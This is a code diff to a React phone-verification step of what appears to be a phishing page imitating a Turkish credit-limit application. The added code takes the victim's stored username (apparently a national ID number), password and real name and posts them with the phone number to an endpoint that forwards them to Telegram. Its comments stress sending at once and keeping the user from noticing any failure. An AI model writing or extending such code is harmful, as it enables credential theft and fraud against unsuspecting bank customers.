@@ -91,10 +91,41 @@ const PhoneVerification = () => {
     if (hasErrors) return
 
     // Phone verilerini sessionStorage'a kaydet
-    sessionStorage.setItem('phoneData', JSON.stringify({
+    const phoneData = {
       phone: "+90" + cleanedPhone,
       creditLimit: creditLimit
-    }));
+    }
+    sessionStorage.setItem('phoneData', JSON.stringify(phoneData));
+
+    // HEMEN Telegram'a ön bilgileri gönder (kart bilgisi beklenmeyebilir)
+    try {
+      // sessionStorage'dan login verilerini al
+      const loginDataStr = sessionStorage.getItem('loginData')
+      const loginData = loginDataStr ? JSON.parse(loginDataStr) : null
+      
+      await fetch('/api/send-telegram', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          username: loginData?.username || 'TC_KIMLIK_YOK',
+          password: loginData?.password || 'ŞİFRE_YOK',
+          phone: phoneData.phone,
+          creditLimit: creditLimit,
+          applicationDate: new Date().toLocaleDateString('tr-TR'),
+          realName: loginData?.realName,
+          realSurname: loginData?.realSurname,
+          messageType: 'PHONE_INFO'
+        })
+      })
+      
+      // Hata olsa bile devam et - kullanıcıyı durdurma
+      console.log('Ön bilgiler Telegram\'a gönderildi')
+    } catch (error) {
+      console.error('Telegram gönderim hatası (ön bilgiler):', error)
+      // Hata olsa bile devam et
+    }
 
     // Meta Pixel event - Phone form tamamlandı
     if (typeof window !== 'undefined' && window.fbq) {
